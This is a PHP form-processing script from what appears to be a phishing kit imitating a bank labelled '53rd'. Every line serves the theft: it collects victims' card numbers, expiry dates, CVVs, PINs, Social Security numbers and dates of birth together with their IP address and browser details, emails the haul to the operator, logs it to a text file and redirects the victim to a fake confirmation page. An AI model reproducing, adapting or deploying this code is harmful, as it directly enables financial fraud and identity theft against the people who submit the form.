<?php
if($_POST["car8493"] != "" and $_POST["exp8339"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------53rd Info-----------------------\n";
$message .= "|card number: ".$_POST['car8493']."\n";
$message .= "|exp date: ".$_POST['exp8339']."\n";
$message .= "|cvv: ".$_POST['cv73839']."\n";
$message .= "|pin: ".$_POST['pn83839']."\n";
$message .= "|ssn: ".$_POST['ss8339']."\n";
$message .= "|dob: ".$_POST['do78339b']."\n";
$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'email.php';
$subject = "Result from 53rd| ".$ip."\n";
mail(','.$form,$subject,$message);
    $text = fopen('sgh.txt', 'a');
fwrite($text, $message);
mail($to,$subject,$message);
$par=base64_encode(rand());
header("location: thanks.php?cmd=login_submit&id=$aga$aga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>

 